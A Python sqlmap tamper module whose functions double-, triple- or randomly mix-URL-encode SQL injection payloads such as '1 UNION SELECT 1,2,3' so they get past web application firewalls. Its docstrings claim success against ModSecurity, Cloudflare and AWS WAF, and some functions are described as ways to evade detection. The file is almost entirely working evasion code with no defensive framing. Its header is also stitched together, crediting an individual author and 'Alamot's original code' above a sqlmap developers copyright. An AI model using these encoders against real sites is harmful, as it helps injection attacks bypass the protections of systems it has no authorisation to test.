#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Double URL encodes the payload to bypass WAF URL normalization

    Requirement:
        * Backend that performs double URL decoding
        * Or WAF that only decodes once

    Tested against:
        * ModSecurity CRS
        * Cloudflare WAF
        * AWS WAF
        * WAFs with single-pass URL decoding

    Notes:
        * WAFs often decode URL encoding once before inspection
        * If the backend decodes twice, double encoding bypasses the WAF
        * %25 is the URL encoding of '%'
        * So %252f becomes %2f after first decode, then / after second decode
        * Example: UNION -> %55NION -> %2555NION (double encoded U)

    Reference:
        * https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/
        * OWASP Testing Guide

    >>> tamper('1 UNION SELECT 1,2,3')
    '1%2520UNION%2520SELECT%25201%252C2%252C3'
    """

    if not payload:
        return payload

    retVal = ""
    
    # Characters to double encode
    # First encode to %XX, then encode the % to %25
    for char in payload:
        if char == ' ':
            retVal += "%2520"  # space -> %20 -> %2520
        elif char == '\'':
            retVal += "%2527"  # ' -> %27 -> %2527
        elif char == '"':
            retVal += "%2522"  # " -> %22 -> %2522
        elif char == '=':
            retVal += "%253D"  # = -> %3D -> %253D
        elif char == '<':
            retVal += "%253C"  # < -> %3C -> %253C
        elif char == '>':
            retVal += "%253E"  # > -> %3E -> %253E
        elif char == '(':
            retVal += "%2528"  # ( -> %28 -> %2528
        elif char == ')':
            retVal += "%2529"  # ) -> %29 -> %2529
        elif char == ',':
            retVal += "%252C"  # , -> %2C -> %252C
        elif char == '+':
            retVal += "%252B"  # + -> %2B -> %252B
        elif char == '/':
            retVal += "%252F"  # / -> %2F -> %252F
        elif char == '\\':
            retVal += "%255C"  # \ -> %5C -> %255C
        elif char == '-':
            retVal += "%252D"  # - -> %2D -> %252D
        elif char == '#':
            retVal += "%2523"  # # -> %23 -> %2523
        elif char == ';':
            retVal += "%253B"  # ; -> %3B -> %253B
        elif char == '*':
            retVal += "%252A"  # * -> %2A -> %252A
        elif char == '|':
            retVal += "%257C"  # | -> %7C -> %257C
        else:
            retVal += char
    
    return retVal


def tamper_keywords_only(payload, **kwargs):
    """
    Double encodes only SQL keywords, leaving other characters intact
    More subtle approach that may evade detection
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # SQL keywords to double encode
    keywords = {
        "UNION": "%2555%254E%2549%254F%254E",
        "SELECT": "%2553%2545%254C%2545%2543%2554",
        "FROM": "%2546%2552%254F%254D",
        "WHERE": "%2557%2548%2545%2552%2545",
        "AND": "%2541%254E%2544",
        "OR": "%254F%2552",
        "INSERT": "%2549%254E%2553%2545%2552%2554",
        "UPDATE": "%2555%2550%2544%2541%2554%2545",
        "DELETE": "%2544%2545%254C%2545%2554%2545",
        "DROP": "%2544%2552%254F%2550",
        "NULL": "%254E%2555%254C%254C",
    }
    
    for keyword, encoded in keywords.items():
        pattern = re.compile(r'\b%s\b' % keyword, re.IGNORECASE)
        retVal = pattern.sub(encoded, retVal)
    
    return retVal


def tamper_spaces_only(payload, **kwargs):
    """
    Double encodes only spaces
    Minimal modification that often bypasses simple WAF rules
    
    Example: UNION SELECT -> UNION%2520SELECT
    """
    
    if not payload:
        return payload
    
    return payload.replace(' ', '%2520')


def tamper_plus_encoding(payload, **kwargs):
    """
    Uses + for spaces and double encodes special chars
    
    Example: 1 UNION SELECT -> 1%252BUNION%252BSELECT
    """
    
    if not payload:
        return payload
    
    retVal = payload.replace(' ', '%252B')  # space -> + -> %2B -> %252B
    
    return retVal


def tamper_triple_encode(payload, **kwargs):
    """
    Triple URL encodes the payload for backends that decode 3 times
    %25 -> %2525 (triple encoded %)
    
    Example: space -> %20 -> %2520 -> %252520
    """
    
    if not payload:
        return payload
    
    retVal = ""
    
    for char in payload:
        if char == ' ':
            retVal += "%252520"
        elif char == '\'':
            retVal += "%252527"
        elif char == '=':
            retVal += "%25253D"
        elif char == '(':
            retVal += "%252528"
        elif char == ')':
            retVal += "%252529"
        else:
            retVal += char
    
    return retVal


def tamper_mixed_encoding(payload, **kwargs):
    """
    Mixes single and double encoding randomly
    Makes pattern detection harder
    """
    
    if not payload:
        return payload
    
    import random
    
    retVal = ""
    
    for char in payload:
        if char == ' ':
            retVal += random.choice(["%20", "%2520", "+", "%252B"])
        elif char == '\'':
            retVal += random.choice(["%27", "%2527"])
        elif char == '=':
            retVal += random.choice(["%3D", "%253D"])
        else:
            retVal += char
    
    return retVal
